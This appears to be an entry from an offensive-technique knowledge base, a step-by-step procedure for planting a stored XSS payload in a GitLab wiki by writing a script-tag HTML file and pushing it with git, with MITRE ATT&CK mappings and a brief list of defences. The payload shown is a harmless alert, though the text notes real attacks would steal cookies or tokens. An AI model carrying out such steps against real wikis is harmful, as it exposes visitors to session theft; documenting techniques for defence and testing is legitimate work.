---
id: proc-003
tags:
  - xss
  - html-upload
  - git-push
  - malicious-file
type: procedure
tools:
  - '[[tools/Git]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/create-xss-html-file]]'
  - '[[commands/git-add-malicious-file]]'
  - '[[commands/git-commit-changes]]'
  - '[[commands/git-push-to-wiki]]'
verified: false
platforms:
  - Linux
  - Web
  - GitLab
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T03:46:37.774Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Remote File Copy]]'
---
# Upload-Malicious-HTML-to-GitLab-Wiki

## Summary

This procedure creates an HTML file with a JavaScript XSS payload, stages it in Git, commits the changes, and pushes to the GitLab wiki, making the malicious content publicly available for rendering.

## Description

The core of the XSS exploit relies on GitLab rendering uploaded HTML without sanitization. The payload, such as an inline <script> tag, executes in the viewer's browser due to absent CSP. This procedure assumes the wiki is cloned and prepared. In production attacks, the script could exfiltrate cookies or tokens via AJAX to an attacker server.

## Requirements

1. Cloned wiki directory (from prior procedure)
2. Git configured with SSH
3. Basic shell access (bash)

## Defense

Defensive measures and detection strategies:

- Enable CSP headers on wiki pages to block inline scripts
- Sanitize HTML uploads in wiki rendering
- Scan commits for suspicious JavaScript patterns

## Objectives

1. Inject persistent XSS payload into wiki
2. Persist the malicious file via Git commit
3. Deploy content for public execution

## Instructions

### Step 1: Create Malicious HTML

**Context**: Generate index.html with XSS script.

**Command** ([[commands/create-xss-html-file]]):
```bash
echo "<script>alert('Hello world!');</script>" > index.html
```

> Writes payload to file. Expected output: File created; cat index.html shows script.

### Step 2: Stage File

**Context**: Add to Git index.

**Command** ([[commands/git-add-malicious-file]]):
```bash
git add index.html
```

> Stages file. Expected output: 'new file: index.html'.

### Step 3: Commit Changes

**Context**: Record the addition.

**Command** ([[commands/git-commit-changes]]):
```bash
git commit -m "This message is super important"
```

> Commits with message. Expected output: '[master abc1234] This message is super important'.

### Step 4: Push to Remote

**Context**: Upload to GitLab wiki.

**Command** ([[commands/git-push-to-wiki]]):
```bash
git push
```

> Pushes to origin. Expected output: 'To git@gitlab.com:dummy/test-wiki.git', branch updated.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript
- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used

- [[commands/create-xss-html-file]]
- [[commands/git-add-malicious-file]]
- [[commands/git-commit-changes]]
- [[commands/git-push-to-wiki]]

## Tools Used

- [[tools/Git]]

## Tags

- xss
- html-upload
